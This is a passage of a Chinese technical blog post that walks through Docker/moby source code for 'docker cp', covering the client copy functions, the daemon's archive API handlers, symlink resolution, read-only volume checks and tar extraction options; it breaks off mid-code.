&#123;<br>dstParent, _ := archive.SplitPathDirEntry(dstPath)<br>linkTarget = filepath.Join(dstParent, linkTarget)<br>&#125;<br>dstInfo.Path = linkTarget<br>dstStat, err = client.ContainerStatPath(ctx, copyConfig.container, linkTarget)<br>&#125;<br>...<br><span class="hljs-keyword">if</span> srcPath == <span class="hljs-string">&quot;-&quot;</span> &#123;<br>content = os.Stdin<br>resolvedDstPath = dstInfo.Path<br><span class="hljs-keyword">if</span> !dstInfo.IsDir &#123;<br><span class="hljs-keyword">return</span> errors.Errorf(<span class="hljs-string">&quot;destination \&quot;%s:%s\&quot; must be a directory&quot;</span>, copyConfig.container, dstPath)<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>srcInfo, err := archive.CopyInfoSourcePath(srcPath, copyConfig.followLink)<br>...<br>srcArchive, err := archive.TarResource(srcInfo)<br>...<br>dstDir, preparedArchive, err := archive.PrepareArchiveCopy(srcArchive, srcInfo, dstInfo)<br>...<br>resolvedDstPath = dstDir<br>content = preparedArchive<br>...<br>&#125;<br>...<br>res := client.CopyToContainer(ctx, copyConfig.container, resolvedDstPath, content, options)<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>和copyFromContainer类似，copyToContainer首先会对dstPath也就是容器内的目标地址进行评估，通过client.ContainerStatPath函数向docker daemon发送请求获取文件信息。如果目标路径是一个链接的话则对于链接的目标地址继续使用client.ContainerStatPath获取信息。<br>在获取到目标地址的信息后，copyToContainer函数使用archive.TarResource函数对宿主机的文件进行打包。最后通过client.CopyToContainer函数将打包后的文件，容器信息，目标地址信息发送给docker daemon的<code>PUT /containers/(containerID)/archive</code>接口。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(cli *Client)</span></span> CopyToContainer(ctx context.Context, containerID, dstPath <span class="hljs-type">string</span>, content io.Reader, options types.CopyToContainerOptions) <span class="hljs-type">error</span> &#123;<br>...<br>apiPath := <span class="hljs-string">&quot;/containers/&quot;</span> + containerID + <span class="hljs-string">&quot;/archive&quot;</span><br>response, err := cli.putRaw(ctx, apiPath, query, content, <span class="hljs-literal">nil</span>)<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>docker daemon接受到此信息后将request中的打包后的文件复制到容器内部。总体而言 copyToContainer的执行流程大致如下图所示，其中红色标识的函数为client向daemon发送请求，其实际的执行逻辑由daemon进行：<br><img src="/.com//bVc80S9"></p><h3 id="docker-client总结"><a href="#docker-client总结" class="headerlink" title="docker client总结"></a>docker client总结</h3><p>通过上述分析可以发现，copyFromContainer和copyToContainer函数的处理逻辑是很相似的，只是打包文件的流向发生了变化，copyFromContainer是<code>docker daemon-&gt;docker client。copyToContainer</code>是<code>docker client-&gt;docker daemon</code>。也就是说docker cp中关于宿主机的文件操作（打包，解包）都是在docker client处进行的，关于容器的文件操作（打包，解包，获取文件信息）都是在docker daemon处进行的。</p><h2 id="docker-daemon-源码分析"><a href="#docker-daemon-源码分析" class="headerlink" title="docker daemon 源码分析"></a>docker daemon 源码分析</h2><p>在moby的 api&#x2F;server&#x2F;router&#x2F;container&#x2F;container.go中定义了如下接口：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *containerRouter)</span></span> initRoutes() &#123;<br>...<br>router.NewHeadRoute(<span class="hljs-string">&quot;/containers/&#123;name:.*&#125;/archive&quot;</span>, r.headContainersArchive),<br>router.NewGetRoute(<span class="hljs-string">&quot;/containers/&#123;name:.*&#125;/archive&quot;</span>, r.getContainersArchive),<br>router.NewPutRoute(<span class="hljs-string">&quot;/containers/&#123;name:.*&#125;/archive&quot;</span>, r.putContainersArchive),<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>这些接口是对外提供给docker client的。通过上面的docker client源码分析我们可以了解到，第一个接口是用来获取容器内部文件信息的，第二个接口使用来从docker daemon向docker client发送打包文件的，第三个接口是用来从docker client向docker daemon发送打包文件的。下面对这些接口的函数做详细分析</p><h3 id="headContainersArchive"><a href="#headContainersArchive" class="headerlink" title="headContainersArchive"></a>headContainersArchive</h3><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *containerRouter)</span></span> headContainersArchive(ctx context.Context, w http.ResponseWriter, r *http.Request, vars <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>) <span class="hljs-type">error</span> &#123;<br>v, err := httputils.ArchiveFormValues(r, vars)<br>...<br>stat, err := s.backend.ContainerStatPath(v.Name, v.Path)<br>...<br><span class="hljs-keyword">return</span> setContainerPathStatHeader(stat, w.Header())<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(daemon *Daemon)</span></span> ContainerStatPath(name <span class="hljs-type">string</span>, path <span class="hljs-type">string</span>) (stat *types.ContainerPathStat, err <span class="hljs-type">error</span>) &#123;<br>ctr, err := daemon.GetContainer(name)<br>...<br>stat, err = daemon.containerStatPath(ctr, path)<br>...<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(daemon *Daemon)</span></span> containerStatPath(container *container.Container, path <span class="hljs-type">string</span>) (stat *types.ContainerPathStat, err <span class="hljs-type">error</span>) &#123;<br>...<br>cfs, err := daemon.openContainerFS(container)<br>...<br><span class="hljs-keyword">return</span> cfs.Stat(context.TODO(), path)<br>&#125;<br></code></pre></td></tr></table></figure><p>headContainersArchive函数通过s.backend.ContainerStatPath调用到daemon.containerStatPath函数。daemon.containerStatPath函数首先打开对应容器的文件系统，并调用该文件系统的Stat函数获取文件信息。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(vw *containerFSView)</span></span> Stat(ctx context.Context, path <span class="hljs-type">string</span>) (*types.ContainerPathStat, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">var</span> stat *types.ContainerPathStat<br>err := vw.RunInFS(ctx, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> &#123;<br>lstat, err := os.Lstat(path)<br>...<br><span class="hljs-keyword">var</span> target <span class="hljs-type">string</span><br><span class="hljs-keyword">if</span> lstat.Mode()&amp;os.ModeSymlink != <span class="hljs-number">0</span> &#123;<br>target, err = symlink.FollowSymlinkInScope(path, <span class="hljs-string">&quot;/&quot;</span>)<br>...<br>&#125;<br>stat = &amp;types.ContainerPathStat&#123;<br>Name:       filepath.Base(path),<br>Size:       lstat.Size(),<br>Mode:       lstat.Mode(),<br>Mtime:      lstat.ModTime(),<br>LinkTarget: target,<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;)<br><span class="hljs-keyword">return</span> stat, err<br>&#125;<br></code></pre></td></tr></table></figure><p>在Stat函数中，首先使用vw.RunInFS限定当前在容器的上下文环境中执行。关于文件的操作，首先使用os.Lstat获取对应文件的FileInfo信息，之后判断该文件是否为链接文件，如果是则使用FollowSymlinkInScope函数获取此链接文件的信息</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">FollowSymlinkInScope</span><span class="hljs-params">(path, root <span class="hljs-type">string</span>)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;<br>path, err := filepath.Abs(filepath.FromSlash(path))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err<br>&#125;<br>root, err = filepath.Abs(filepath.FromSlash(root))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> evalSymlinksInScope(path, root)<br>&#125;<br></code></pre></td></tr></table></figure><p>FollowSymlinkInScope实际上是调用evalSymlinksInScope进行实际的处理逻辑的，evalSymlinksInScope 将在调用时对作用域 <code>root</code> 中 <code>path</code> 的符号链接进行评估，并返回保证包含在作用域 <code>root</code> 中的结果。例如：&#x2F;foo&#x2F;bar链接指向&#x2F;outside，那么evalSymlinksInScope（“&#x2F;foo&#x2F;bar”，“&#x2F;foo”）会返回&#x2F;foo&#x2F;outside。</p><h3 id="getContainersArchive"><a href="#getContainersArchive" class="headerlink" title="getContainersArchive"></a>getContainersArchive</h3><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *containerRouter)</span></span> getContainersArchive(ctx context.Context, w http.ResponseWriter, r *http.Request, vars <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>) <span class="hljs-type">error</span> &#123;<br>v, err := httputils.ArchiveFormValues(r, vars)<br>...<br>tarArchive, stat, err := s.backend.ContainerArchivePath(v.Name, v.Path)<br>...<br><span class="hljs-keyword">return</span> writeCompressedResponse(w, r, tarArchive)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(daemon *Daemon)</span></span> ContainerArchivePath(name <span class="hljs-type">string</span>, path <span class="hljs-type">string</span>) (content io.ReadCloser, stat *types.ContainerPathStat, err <span class="hljs-type">error</span>) &#123;<br>ctr, err := daemon.GetContainer(name)<br>...<br>content, stat, err = daemon.containerArchivePath(ctr, path)<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>当docker daemon检测到”GET &#x2F;containers&#x2F;(containerID)&#x2F;archive”接口有消息时会进入到getContainersArchive函数。getContainersArchive函数会经过s.backend.ContainerArchivePath函数调用到daemon.containerArchivePath函数。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(daemon *Daemon)</span></span> containerArchivePath(container *container.Container, path <span class="hljs-type">string</span>) (content io.ReadCloser, stat *types.ContainerPathStat, err <span class="hljs-type">error</span>) &#123;<br>cfs, err := daemon.openContainerFS(container)<br>absPath := archive.PreserveTrailingDotOrSeparator(filepath.Join(<span class="hljs-string">&quot;/&quot;</span>, path), path)<br><br>stat, err = cfs.Stat(context.TODO(), absPath)<br>...<br>sourceDir, sourceBase := absPath, <span class="hljs-string">&quot;.&quot;</span><br><span class="hljs-keyword">if</span> stat.Mode&amp;os.ModeDir == <span class="hljs-number">0</span> &#123; <span class="hljs-comment">// not dir</span><br>sourceDir, sourceBase = filepath.Split(absPath)<br>&#125;<br>opts := archive.TarResourceRebaseOpts(sourceBase, filepath.Base(absPath))<br><br>tb, err := archive.NewTarballer(sourceDir, opts)<br>...<br>cfs.GoInFS(context.TODO(), tb.Do)<br>data := tb.Reader()<br>content = ioutils.NewReadCloserWrapper(data, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> &#123;<br>err := data.Close()<br>_ = cfs.Close()<br>container.Unlock()<br><span class="hljs-keyword">return</span> err<br>&#125;)<br>...<br><span class="hljs-keyword">return</span> content, stat, <span class="hljs-literal">nil</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>该函数首先通过容器信息打开一个容器的文件系统，使用Stat函数获取要打包的文件信息。如果该文件不是路径类文件，则sourceDir，sourceBase分别为该文件的路径和文件名，否则sourceDir和sourceBase分别为该文件的路径和“.“。例如：要打包的文件为&#x2F;etc&#x2F;passwd，那么sourceDir为&#x2F;etc&#x2F;,sourceBase为passwd；要打包的文件为&#x2F;etc&#x2F;，那么sourceDir为&#x2F;etc&#x2F;，sourceBase为“.”</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs golang">cfs, err := daemon.openContainerFS(container)<br>absPath := archive.PreserveTrailingDotOrSeparator(filepath.Join(<span class="hljs-string">&quot;/&quot;</span>, path), path)<br><br>stat, err = cfs.Stat(context.TODO(), absPath)<br>...<br>sourceDir, sourceBase := absPath, <span class="hljs-string">&quot;.&quot;</span><br><span class="hljs-keyword">if</span> stat.Mode&amp;os.ModeDir == <span class="hljs-number">0</span> &#123; <span class="hljs-comment">// not dir</span><br>sourceDir, sourceBase = filepath.Split(absPath)<br>&#125;<br></code></pre></td></tr></table></figure><p>之后根据sourceDir和opts（由sourceBase生成的用来指示打包信息的选项）生成一个新的Tarballer对象。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs golang">opts := archive.TarResourceRebaseOpts(sourceBase, filepath.Base(absPath))<br>tb, err := archive.NewTarballer(sourceDir, opts)<br></code></pre></td></tr></table></figure><p>下面就要进行文件打包的操作了，首先会使用GoInFS将该操作限定在容器的上下文环境中，在容器的上下文环境中使用tb.Do进行具体的打包逻辑,最后将打包好的文件返回。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs golang">cfs.GoInFS(context.TODO(), tb.Do)<br>data := tb.Reader()<br>content = ioutils.NewReadCloserWrapper(data, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> &#123;<br>err := data.Close()<br>_ = cfs.Close()<br>container.Unlock()<br><span class="hljs-keyword">return</span> err<br>&#125;)<br>...<br><span class="hljs-keyword">return</span> content, stat, <span class="hljs-literal">nil</span><br></code></pre></td></tr></table></figure><h3 id="putContainersArchive"><a href="#putContainersArchive" class="headerlink" title="putContainersArchive"></a>putContainersArchive</h3><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *containerRouter)</span></span> putContainersArchive(ctx context.Context, w http.ResponseWriter, r *http.Request, vars <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>) <span class="hljs-type">error</span> &#123;<br>v, err := httputils.ArchiveFormValues(r, vars)<br>...<br><span class="hljs-keyword">return</span> s.backend.ContainerExtractToDir(v.Name, v.Path, copyUIDGID, noOverwriteDirNonDir, r.Body)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(daemon *Daemon)</span></span> ContainerExtractToDir(name, path <span class="hljs-type">string</span>, copyUIDGID, noOverwriteDirNonDir <span class="hljs-type">bool</span>, content io.Reader) <span class="hljs-type">error</span> &#123;<br>ctr, err := daemon.GetContainer(name)<br>...<br>err = daemon.containerExtractToDir(ctr, path, copyUIDGID, noOverwriteDirNonDir, content)<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>当docker daemon监听到<code>PUT /containers/(containerID)/archive</code>接口有请求时会进入putContainersArchive函数。该函数会通过s.backend.ContainerExtractToDir函数调用到daemon.containerExtractToDir函数。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(daemon *Daemon)</span></span> containerExtractToDir(container *container.Container, path <span class="hljs-type">string</span>, copyUIDGID, noOverwriteDirNonDir <span class="hljs-type">bool</span>, content io.Reader) (err <span class="hljs-type">error</span>) &#123;<br>...<br>cfs, err := daemon.openContainerFS(container)<br>...<br>err = cfs.RunInFS(context.TODO(), <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> &#123;<br>...<br>absPath, err := filepath.EvalSymlinks(filepath.Join(<span class="hljs-string">&quot;/&quot;</span>, path))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>absPath = archive.PreserveTrailingDotOrSeparator(absPath, path)<br><br>stat, err := os.Lstat(absPath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">if</span> !stat.IsDir() &#123;<br><span class="hljs-keyword">return</span> errdefs.InvalidParameter(errors.New(<span class="hljs-string">&quot;extraction point is not a directory&quot;</span>))<br>&#125;<br><br><span class="hljs-comment">// Need to check if the path is in a volume. If it is, it cannot be in a</span><br><span class="hljs-comment">// read-only volume. If it is not in a volume, the container cannot be</span><br><span class="hljs-comment">// configured with a read-only rootfs.</span><br>toVolume, err := checkIfPathIsInAVolume(container, absPath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-keyword">if</span> !toVolume &amp;&amp; container.HostConfig.ReadonlyRootfs &#123;<br><span class="hljs-keyword">return</span> errdefs.InvalidParameter(errors.New(<span class="hljs-string">&quot;container rootfs is marked read-only&quot;</span>))<br>&#125;<br><br>options := daemon.defaultTarCopyOptions(noOverwriteDirNonDir)<br><br><span class="hljs-keyword">if</span> copyUIDGID &#123;<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br><span class="hljs-comment">// tarCopyOptions will appropriately pull in the right uid/gid for the</span><br><span class="hljs-comment">// user/group and will set the options.</span><br>options, err = daemon.tarCopyOptions(container, noOverwriteDirNonDir)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> archive.Untar(content, absPath, options)<br>&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br>daemon.LogContainerEvent(container, <span class="hljs-string">&quot;extract-to-dir&quot;</span>)<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>该函数首先通过容器信息打开对应容器的文件系统，之后使用RunInFS将文件解包的操作限制在容器的上下文环境之中。在文件解包时，docker daemon首先通过filepath.EvalSymlinks函数解析目标目录的绝对路径，在此过程中所有符号连接都会被解析。完成解析后，会使用os.Lstat函数获取文件的状态信息。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs golang">absPath, err := filepath.EvalSymlinks(filepath.Join(<span class="hljs-string">&quot;/&quot;</span>, path))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>absPath = archive.PreserveTrailingDotOrSeparator(absPath, path)<br><br>stat, err := os.Lstat(absPath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">if</span> !stat.IsDir() &#123;<br><span class="hljs-keyword">return</span> errdefs.InvalidParameter(errors.New(<span class="hljs-string">&quot;extraction point is not a directory&quot;</span>))<br>&#125;<br></code></pre></td></tr></table></figure><p>之后会判断该目标路径是否位于一个只读卷或者只读的rootfs中，如果返回true则会报错。<br>此部分的具体处理逻辑为：<br>调用checkIfPathIsInAVolume函数判断目标路径是否在挂载卷中，如果是则把toVolume置为true并判断该卷是否为一个只读卷，如果是一个只读卷则返回false和一个err。<br>调用完该函数后对该函数的返回值做一个判断，如果err不为空则代表该目标路径位于一个只读卷中，则直接返回该err。否则使用toVolume判断目标路径是否在一个挂载卷中（此时如果toVolume为true那么该卷一定为可读写的。）如果目标路径不在挂载卷中并且此时的rootfs也是只读的，那么就返回一个错误</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs golang">toVolume, err := checkIfPathIsInAVolume(container, absPath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-keyword">if</span> !toVolume &amp;&amp; container.HostConfig.ReadonlyRootfs &#123;<br><span class="hljs-keyword">return</span> errdefs.InvalidParameter(errors.New(<span class="hljs-string">&quot;container rootfs is marked read-only&quot;</span>))<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">checkIfPathIsInAVolume</span><span class="hljs-params">(container *container.Container, absPath <span class="hljs-type">string</span>)</span></span> (<span class="hljs-type">bool</span>, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">var</span> toVolume <span class="hljs-type">bool</span><br>parser := volumemounts.NewParser()<br><span class="hljs-keyword">for</span> _, mnt := <span class="hljs-keyword">range</span> container.MountPoints &#123;<br><span class="hljs-keyword">if</span> toVolume = parser.HasResource(mnt, absPath); toVolume &#123;<br><span class="hljs-keyword">if</span> mnt.RW &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, errdefs.InvalidParameter(errors.New(<span class="hljs-string">&quot;mounted volume is marked read-only&quot;</span>))<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> toVolume, <span class="hljs-literal">nil</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>解包的下一步操作是根据是否需要复制文件的UID和GID设置不同的options，并将options作为参数与打包文件的信息content和目标文件路径absPath共同传入archive.Untar函数执行具体的解包逻辑。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs golang">options := daemon.defaultTarCopyOptions(noOverwriteDirNonDir)<br><br><span class="hljs-keyword">if</span> copyUIDGID &#123;<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br><span class="hljs-comment">// tarCopyOptions will appropriately pull in the right uid/gid for the</span><br><span class="hljs-comment">// user/group and will set the options.</span><br>options, err = daemon.tarCopyOptions(container, noOverwriteDirNonDir)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> archive.Untar(content, absPath, options)<br><br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(daemon *Daemon)</span></span> tarCopyOptions(container *container.Container, noOverwriteDirNonDir <span class="hljs-type">bool</span>) (*archive.TarOptions, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">if</span> container.Config.User == <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">return</span> daemon.defaultTarCopyOptions(noOverwriteDirNonDir), <span class="hljs-literal">nil</span><br>&#125;<br><br>user, err := idtools.LookupUser(container.Config.User)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br>identity := idtools.Identity&#123;UID: user.Uid, GID: user.Gid&#125;<br><br><span class="hljs-keyword">return</span> &amp;archive.TarOptions&#123;<br>NoOverwriteDirNonDir: noOverwriteDirNonDir,<br>ChownOpts:            &amp;identity,<br>&#125;, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>如果copyUIDGID为false，那么options则为默认的配置。否则options由tarCopyOptions函数生成，该函数生成的options中会附带UID GID的信息。</p><h3 id="GoInFS-RunInFS"><a href="#GoInFS-RunInFS" class="headerlink" title="GoInFS&amp;&amp;RunInFS"></a>GoInFS&amp;&amp;RunInFS</h3><p>在上面的描述中我们会发现docker daemon使用了GoInFS和RunInFS函数将操作限制在了容器的上下文里，那么这是如何实现的呢？以GoInFS函数为例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span 